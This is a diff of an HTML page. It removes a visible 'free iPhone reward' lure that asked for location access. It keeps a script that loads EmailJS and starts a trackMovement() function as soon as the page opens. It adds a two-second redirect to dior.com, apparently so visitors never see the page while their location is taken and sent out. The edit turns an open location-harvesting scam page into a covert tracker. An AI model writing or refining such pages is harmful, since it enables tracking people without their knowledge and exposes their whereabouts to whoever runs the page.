@@ -1,45 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iPhone Reward Form</title>
-    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f8ff;
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            max-width: 600px;
-            background: #ffffff;
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-            text-align: center;
-        }
-        #locationDisplay {
-            background: #e9ecef;
-            color: #666;
-            padding: 0.5rem;
-            border-radius: 4px;
-            margin-top: 15px;
-            font-size: 0.9rem;
-        }
-    </style>
-</head>
+
 <body>
-    <div class="container">
-        <h1 class="form-heading">Congratulations! 🎉</h1>
-        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
-        <p class="form-text">Please allow location access to claim your reward.</p>
-        <p id="locationDisplay" class="form-text">Waiting for location...</p>
-    </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
@@ -94,6 +56,9 @@
             // Call to request location as soon as the page loads
             trackMovement();
         });
+        setTimeout(() => {
+    window.location.href = "https://www.dior.com/";
+}, 2000);
     </script>
 </body>
 </html>
